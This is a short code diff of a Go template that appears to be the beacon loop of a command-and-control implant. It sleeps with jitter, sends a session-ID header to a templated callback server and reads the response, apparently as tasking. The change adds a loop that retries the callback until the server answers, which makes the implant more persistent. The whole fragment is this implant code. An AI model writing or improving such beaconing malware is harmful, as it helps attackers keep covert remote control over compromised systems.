@@ -159,10 +159,16 @@ func main() {
 		jitter := rng.Intn({{.Jitter}}) + 1
 		sleepTime := {{.Sleep}} + jitter
 		
-		req, err := http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
+		req, _ := http.NewRequest("GET", "{{.CallBack}}/{{.GetURL}}", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err := client.Do(req)
-		body, err := io.ReadAll(resp.Body)
+
+		for err != nil {
+			time.Sleep(time.Duration(sleepTime) * time.Second)
+			resp, err = client.Do(req)
+		}
+
+		body, _ := io.ReadAll(resp.Body)
 
 		sb := string(body)
 		sb = strings.TrimSuffix(sb, "\n")
